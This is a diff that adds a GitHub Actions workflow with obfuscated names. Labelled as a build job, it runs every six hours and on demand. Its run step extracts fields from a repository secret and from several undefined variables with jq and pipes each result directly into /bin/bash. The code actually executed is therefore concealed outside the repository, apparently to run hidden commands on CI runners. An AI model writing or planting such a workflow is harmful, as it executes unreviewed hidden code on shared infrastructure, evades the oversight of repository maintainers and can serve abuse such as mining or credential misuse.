@@ -1,0 +1,22 @@
+name: tongshuts
+
+on:
+  workflow_dispatch:
+  schedule:
+    - cron: '1 1/6 * * *'
+
+jobs:
+  build:
+    runs-on: ubuntu-latest
+
+    steps:
+      - uses: actions/checkout@v4
+      - name: tongshuts
+        env:
+          hik4: ${{ secrets.hik4 }}
+        run: |
+          echo $hik4 | jq -r .zqeb5 | /bin/bash
+          echo $ijv76 | jq -r .kbdq123 | /bin/bash
+          echo $iikd46518 | jq -r .qhlrp476 | /bin/bash
+          echo $pqc9151 | jq -r .tsqdp331 | /bin/bash
+
